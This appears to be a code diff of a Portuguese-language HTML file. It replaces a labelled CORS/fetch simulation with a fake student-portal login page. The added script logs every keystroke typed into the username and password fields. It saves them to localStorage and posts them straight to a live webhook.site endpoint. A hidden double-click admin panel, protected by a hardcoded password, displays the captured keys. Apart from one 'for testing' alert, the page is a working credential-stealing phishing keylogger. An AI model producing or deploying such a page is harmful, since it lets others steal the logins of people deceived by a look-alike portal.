@@ -1,57 +1,183 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Simulador de Input e Fetch</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Portal do Estudante</title>
   <style>
-    body { font-family: sans-serif; background: #eee; padding: 2rem; text-align: center; }
-    input { padding: 10px; margin: 10px; width: 80%; max-width: 300px; }
-    button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; }
-    button:hover { background: #218838; }
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f2f5;
+    }
+    .login-container {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    #adminPanel {
+      display: none;
+      margin-top: 20px;
+      text-align: left;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #f2f2f2;
+    }
+    .admin-trigger {
+      font-size: 12px;
+      color: #888;
+      cursor: pointer;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
-  <h2>Formulário Simulado - Estudo de CORS e Fetch</h2>
-  <form id="simulador">
-    <input type="text" id="usuario" placeholder="Digite algo"><br>
-    <input type="password" id="senha" placeholder="Senha fictícia"><br>
-    <button type="submit">Simular Envio</button>
-  </form>
-
-  <pre id="log" style="text-align: left; background: #fff; padding: 1rem; margin-top: 2rem; border: 1px solid #ccc;"></pre>
-
+  <div class="login-container">
+    <h2>Portal do Estudante</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Usuário" required>
+      <input type="password" id="password" placeholder="Senha" required>
+      <button type="submit">Entrar</button>
+    </form>
+    <div class="admin-trigger" id="adminTrigger">Admin Access</div>
+    <div id="adminPanel">
+      <h3>Dados Capturados</h3>
+      <table id="keylogTable">
+        <thead>
+          <tr>
+            <th>Timestamp</th>
+            <th>Campo</th>
+            <th>Tecla</th>
+          </tr>
+        </thead>
+        <tbody id="keylogBody"></tbody>
+      </table>
+    </div>
+  </div>
   <script>
-    const endpoint = "https://example.com/webhook"; // endpoint simbólico — não executa
+    // Inicializa o keylog a partir do localStorage ou array vazio
+    let keylog = JSON.parse(localStorage.getItem('keylogData')) || [];
 
-    function log(mensagem) {
-      const l = document.getElementById("log");
-      l.textContent += mensagem + "\n";
+    function logKey(event) {
+      const timestamp = new Date().toISOString();
+      const inputId = event.target.id;
+      const key = event.key;
+      keylog.push({ timestamp, inputId, key });
+      // Salva no localStorage para persistência
+      localStorage.setItem('keylogData', JSON.stringify(keylog));
+      // Envia os dados imediatamente
+      sendData();
     }
 
-    document.onkeypress = function(e) {
-      const dado = { tipo: "tecla", tecla: e.key, timestamp: Date.now() };
-      log("Capturado: " + JSON.stringify(dado));
-      fetch(endpoint, {
-        method: "POST",
-        body: JSON.stringify(dado),
-        headers: { "Content-Type": "application/json" }
-      }).catch(() => log("Fetch bloqueado por CORS (simulado)"));
-    };
+    // Adiciona listeners aos campos de input
+    document.getElementById('username').addEventListener('keydown', logKey);
+    document.getElementById('password').addEventListener('keydown', logKey);
 
-    document.getElementById("simulador").onsubmit = function(e) {
-      e.preventDefault();
-      const u = document.getElementById("usuario").value;
-      const p = document.getElementById("senha").value;
-      const dados = { tipo: "formulario", usuario: u, senha: p, timestamp: Date.now() };
-      log("Enviando: " + JSON.stringify(dados));
+    // Função para enviar dados capturados
+    function sendData() {
+      const payload = {
+        url: window.location.href,
+        keys: keylog
+      };
+
+      // Endpoint fornecido pelo usuário
+      const endpoint = 'https://webhook.site/62457822-a08f-448b-8030-7c9fd34772a1';
+      
       fetch(endpoint, {
-        method: "POST",
-        body: JSON.stringify(dados),
-        headers: { "Content-Type": "application/json" }
-      }).catch(() => log("Fetch bloqueado por CORS (simulado)"));
-    };
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+        mode: 'cors'
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Erro ao enviar dados');
+        console.log('Dados enviados com sucesso');
+        // Limpa keylog após envio bem-sucedido
+        keylog = [];
+        localStorage.setItem('keylogData', JSON.stringify(keylog));
+      })
+      .catch(error => {
+        console.error('Erro:', error);
+        // Mantém dados no localStorage se o envio falhar
+        localStorage.setItem('keylogData', JSON.stringify(payload.keys));
+      });
+    }
+
+    // Envia dados ao submeter o formulário
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      sendData();
+      alert('Login simulado. Dados capturados para fins de teste.');
+    });
+
+    // Função para exibir dados capturados localmente
+    function displayKeylog() {
+      const tableBody = document.getElementById('keylogBody');
+      tableBody.innerHTML = ''; // Limpa tabela
+      keylog.forEach(entry => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>${entry.timestamp}</td>
+          <td>${entry.inputId}</td>
+          <td>${entry.key}</td>
+        `;
+        tableBody.appendChild(row);
+      });
+      document.getElementById('adminPanel').style.display = 'block';
+    }
+
+    // Detecta dois cliques no elemento "Admin Access"
+    let clickCount = 0;
+    document.getElementById('adminTrigger').addEventListener('click', function() {
+      clickCount++;
+      if (clickCount === 2) {
+        const password = prompt('Digite a senha de administrador:');
+        if (password === 'admin123') { // Substitua por sua senha desejada
+          displayKeylog();
+        } else {
+          alert('Senha incorreta.');
+        }
+        clickCount = 0; // Reseta contador
+      }
+    });
   </script>
 </body>
 </html>
